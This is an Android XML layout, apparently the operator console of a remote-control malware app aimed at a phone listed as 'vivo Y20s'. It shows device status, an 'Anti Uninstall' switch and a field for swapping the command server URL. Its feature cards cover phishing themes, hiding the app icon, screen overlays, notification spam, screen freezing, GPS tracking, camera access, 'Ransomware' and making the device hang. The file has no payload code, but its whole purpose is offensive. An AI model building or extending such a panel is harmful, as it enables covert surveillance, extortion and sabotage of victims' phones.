<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#090F1D"
    android:fillViewport="true">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="16dp">

        <!-- ===== HERO CARD ===== -->
        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="240dp"
            android:background="@drawable/hero_card_bg"
            android:orientation="vertical"
            android:padding="20dp"
            android:layout_marginBottom="16dp">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="end">

                <TextView
                    android:id="@+id/tvDeviceId"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="1e5b8925ea01bef1"
                    android:textColor="#9CA3AF"
                    android:textSize="12sp"
                    android:fontFamily="sans-serif" />

            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="0dp"
                android:layout_weight="1"
                android:orientation="vertical"
                android:gravity="center_vertical">

                <TextView
                    android:id="@+id/tvDeviceName"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="vivo Y20s"
                    android:textColor="#FFFFFF"
                    android:textSize="22sp"
                    android:textStyle="bold"
                    android:fontFamily="sans-serif" />

                <TextView
                    android:id="@+id/tvStatus"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="ONLINE"
                    android:textColor="#4ADE80"
                    android:textSize="13sp"
                    android:fontFamily="sans-serif"
                    android:layout_marginTop="4dp" />

            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="end">

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Anti Uninstall"
                    android:textColor="#9CA3AF"
                    android:textSize="12sp"
                    android:fontFamily="sans-serif" />

                <TextView
                    android:id="@+id/tvAntiUninstallText"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="OFF"
                    android:textColor="#FF5C7C"
                    android:textSize="12sp"
                    android:fontFamily="sans-serif"
                    android:layout_marginStart="8dp" />

                <Switch
                    android:id="@+id/swAntiUninstall"
                    android:layout_width="46dp"
                    android:layout_height="26dp"
                    android:thumbTint="#FFFFFF"
                    android:trackTint="#2A3A5C"
                    android:layout_marginStart="12dp" />

            </LinearLayout>

        </LinearLayout>

        <!-- ===== DEVICE SELECTOR CARD ===== -->
        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="90dp"
            android:background="@drawable/device_card_bg"
            android:orientation="horizontal"
            android:padding="16dp"
            android:gravity="center_vertical"
            android:layout_marginBottom="16dp">

            <ImageView
                android:layout_width="48dp"
                android:layout_height="48dp"
                android:src="@drawable/ic_device"
                android:background="@drawable/icon_bg"
                android:padding="12dp" />

            <LinearLayout
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="vertical"
                android:layout_marginStart="16dp">

                <TextView
                    android:id="@+id/tvDeviceName2"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="vivo Y20s"
                    android:textColor="#FFFFFF"
                    android:textSize="17sp"
                    android:textStyle="bold"
                    android:fontFamily="sans-serif" />

                <TextView
                    android:id="@+id/tvDeviceId2"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="1e5b8925ea01bef1"
                    android:textColor="#9CA3AF"
                    android:textSize="13sp"
                    android:fontFamily="sans-serif" />

            </LinearLayout>

            <TextView
                android:id="@+id/tvBattery"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="78%"
                android:textColor="#4ADE80"
                android:textSize="17sp"
                android:textStyle="bold"
                android:fontFamily="sans-serif"
                android:layout_marginEnd="12dp" />

            <Button
                android:id="@+id/btnGanti"
                android:layout_width="36dp"
                android:layout_height="36dp"
                android:background="@drawable/dropdown_bg"
                android:text="⌄"
                android:textColor="#FFFFFF"
                android:textSize="18sp" />

        </LinearLayout>

        <!-- ===== JUDUL SECTION ===== -->
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="KONTROL DEVICE"
            android:textColor="#FFFFFF"
            android:textSize="22sp"
            android:textStyle="bold"
            android:fontFamily="sans-serif"
            android:layout_marginBottom="16dp" />

        <!-- ===== GRID 2 KOLOM ===== -->
        <!-- Menggunakan LinearLayout dengan weight untuk grid 2 kolom -->
        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical">

            <!-- Baris 1 -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal">

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardFlashlight"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginEnd="6dp" />

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardLockLow"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginStart="6dp" />
            </LinearLayout>

            <!-- Baris 2 -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:layout_marginTop="12dp">

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardLockCustom"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginEnd="6dp" />

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardTemaPhising"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginStart="6dp" />
            </LinearLayout>

            <!-- Baris 3 -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:layout_marginTop="12dp">

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardHideIcon"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginEnd="6dp" />

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardVideoOverlay"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginStart="6dp" />
            </LinearLayout>

            <!-- Baris 4 -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:layout_marginTop="12dp">

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardSpamNotif"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginEnd="6dp" />

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardStuckLayar"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginStart="6dp" />
            </LinearLayout>

            <!-- Baris 5 -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:layout_marginTop="12dp">

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardGPS"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginEnd="6dp" />

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardKamera"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginStart="6dp" />
            </LinearLayout>

            <!-- Baris 6 -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:layout_marginTop="12dp">

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardRansomware"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginEnd="6dp" />

                <include
                    layout="@layout/card_fitur"
                    android:id="@+id/cardNgehang"
                    android:layout_width="0dp"
                    android:layout_height="160dp"
                    android:layout_weight="1"
                    android:layout_marginStart="6dp" />
            </LinearLayout>

        </LinearLayout>

        <!-- ===== GANTI SERVER ===== -->
        <EditText
            android:id="@+id/etServerUrl"
            android:layout_width="match_parent"
            android:layout_height="48dp"
            android:hint="Masukkan URL server baru..."
            android:textColor="#FFFFFF"
            android:textColorHint="#9CA3AF"
            android:background="@drawable/input_bg"
            android:padding="16dp"
            android:fontFamily="sans-serif"
            android:textSize="13sp"
            android:layout_marginTop="16dp"
            android:layout_marginBottom="12dp" />

        <Button
            android:id="@+id/btnSetServer"
            android:layout_width="match_parent"
            android:layout_height="48dp"
            android:text="GANTI SERVER"
            android:textColor="#FFFFFF"
            android:background="@drawable/primary_btn_bg"
            android:textStyle="bold"
            android:fontFamily="sans-serif"
            android:textSize="13sp" />

        <!-- ===== FLOATING BUTTON ===== -->
        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="80dp"
            android:gravity="center|end"
            android:orientation="horizontal">

            <Button
                android:layout_width="60dp"
                android:layout_height="60dp"
                android:background="@drawable/fab_bg"
                android:text="+"
                android:textColor="#FFFFFF"
                android:textSize="28sp"
                android:shadowColor="#4D8DFF"
                android:shadowDx="0"
                android:shadowDy="0"
                android:shadowRadius="30" />

        </LinearLayout>

    </LinearLayout>

</ScrollView>
